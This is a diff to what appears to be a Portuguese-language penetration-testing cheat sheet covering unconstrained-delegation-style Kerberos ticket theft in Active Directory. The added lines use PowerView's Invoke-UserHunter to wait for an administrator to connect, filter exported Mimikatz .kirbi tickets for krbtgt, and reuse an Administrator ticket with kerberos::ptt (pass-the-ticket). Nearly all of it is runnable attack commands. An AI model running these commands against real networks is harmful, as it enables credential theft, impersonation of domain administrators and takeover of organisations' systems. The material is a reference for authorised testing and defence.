@@ -1286,11 +1286,19 @@ MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS  (WAIT OR TRICK AN USER TO US
 sekurlsa::tickets
 sekurlsa::tickets /export
 ```
-FILTRAR OS TICKETS
+AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE ALGUM TIPO DE ADMIN)
+```
+Invoke-UserHunter -ComputerName server01  -Delay 5 -Verbose
+Invoke-UserHunter -ComputerName server01 -UserIdentity administrator -Delay 5 -Verbose
+```
+FILTRAR OS TICKETS (OPCIONAL)
 ```
 dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
 ```
-
+REUTILIZAR O TICKET DO USUARIO:
+```
+kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TECH.LOCAL.kirbi
+```
 
 
 
